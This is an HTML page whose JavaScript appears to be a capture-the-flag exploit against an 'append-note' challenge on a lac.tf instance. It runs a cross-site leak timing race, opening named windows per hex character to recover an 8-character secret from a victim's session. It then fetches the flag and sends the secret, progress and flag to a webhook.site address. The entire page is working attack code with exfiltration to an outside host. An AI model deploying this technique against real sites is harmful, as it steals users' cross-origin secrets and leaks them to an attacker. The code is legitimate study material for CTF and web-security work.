<!DOCTYPE html>
<html>
<head><title>XS-Leak Race</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-hfskv.instancer.lac.tf";
var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";
var CHARS = "0123456789abcdef";

navigator.sendBeacon(WEBHOOK, "RACE_V2");

function report(d) {
    navigator.sendBeacon(WEBHOOK, d);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(d);
}
function setStatus(s) { document.getElementById('s').textContent = s; }

// Race all chars simultaneously using form.submit to named windows
function racePosition(prefix) {
    return new Promise(function(resolve) {
        var finished = [];
        var done = 0;
        var total = CHARS.length;
        var windows = [];
        var intervals = [];
        
        for (var i = 0; i < total; i++) {
            (function(c, idx) {
                var wname = 'w' + idx + '_' + Date.now();
                
                var form = document.createElement('form');
                form.method = 'GET';
                form.action = TARGET + '/append?content=' + encodeURIComponent(prefix + c) + '&url=' + encodeURIComponent(TARGET + '/');
                form.target = wname;
                form.style.display = 'none';
                document.body.appendChild(form);
                
                var startTime = performance.now();
                form.submit();
                document.body.removeChild(form);
                
                // Get window reference
                var w = window.open('', wname);
                windows.push({ w: w, c: c });
                
                // Poll for completion
                var interval = setInterval(function() {
                    try {
                        // Access check - cross-origin throws
                        var loc = w.location.href;
                    } catch(e) {
                        // Loaded and redirected
                        clearInterval(interval);
                        var elapsed = performance.now() - startTime;
                        finished.push({ c: c, time: elapsed, order: finished.length });
                        done++;
                        try { w.close(); } catch(x) {}
                        if (done >= total) resolve(finished);
                    }
                }, 3);
                intervals.push(interval);
                
            })(CHARS[i], i);
        }
        
        // Timeout fallback
        setTimeout(function() {
            for (var i = 0; i < intervals.length; i++) clearInterval(intervals[i]);
            for (var i = 0; i < windows.length; i++) {
                try { windows[i].w.close(); } catch(e) {}
            }
            if (done < total) {
                // Fill remaining
                for (var i = 0; i < total; i++) {
                    var c = CHARS[i];
                    var found = finished.some(function(f) { return f.c === c; });
                    if (!found) finished.push({ c: c, time: 9999, order: finished.length });
                }
                resolve(finished);
            }
        }, 5000);
    });
}

async function main() {
    report('START');
    setStatus('Racing...');
    
    try {
        var secret = "";
        
        for (var p = 0; p < 8; p++) {
            setStatus('P' + p + '...');
            var results = await racePosition(secret);
            
            // Sort by order (first to finish)
            results.sort(function(a,b) { return a.order - b.order; });
            
            // Report top 3
            var top3 = results.slice(0, 3).map(function(r) { return r.c + ':' + Math.round(r.time); }).join(',');
            report('P' + p + ':' + top3);
            
            // Take first to finish
            secret += results[0].c;
        }
        
        report('SEC:' + secret);
        
        // Try to get flag
        var resp = await fetch(TARGET + '/flag?secret=' + secret);
        var flag = await resp.text();
        report('FLAG:' + flag);
        setStatus(flag);
        
    } catch(e) {
        report('ERR:' + e);
    }
}

main();
</script>
</body>
</html>
